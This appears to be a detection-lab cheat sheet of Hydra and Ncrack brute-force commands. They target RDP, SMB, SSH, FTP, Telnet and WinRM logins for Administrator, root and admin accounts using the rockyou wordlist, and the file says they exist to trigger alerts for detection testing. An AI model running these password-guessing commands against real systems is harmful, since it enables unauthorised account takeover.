# 🔐 Brute Force Attack Scripts - ThreatDetectionLab

This file lists brute-force attack commands used for testing detection across various services in the ThreatDetectionLab. These simulate real-world attacker behavior to trigger log events, IDS alerts, and correlation rules.

---

## 🔑 Brute Force Scripts (Hydra & Ncrack)

### RDP (Port 3389)

hydra -t 4 -V -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<target>
ncrack -p 3389 -u Administrator -P rockyou.txt <target>

---
### SMB (Port 445)

hydra -t 4 -V -l Administrator -P /usr/share/wordlists/rockyou.txt smb://<target>
ncrack -p 445 -u Administrator -P rockyou.txt <target>

---
### SSH (Port 22)

hydra -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>
ncrack -p 22 -u root -P rockyou.txt <target>

---

### FTP (Port 21)
hydra -t 4 -V -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>
ncrack -p 21 -u admin -P rockyou.txt <target>

---

### Telnet (Port 23)

hydra -t 4 -V -l admin -P /usr/share/wordlists/rockyou.txt telnet://<target>
ncrack -p 23 -u admin -P rockyou.txt <target>

---
### WinRM (Port 5985)

ncrack -p 5985 -u Administrator -P rockyou.txt <target>




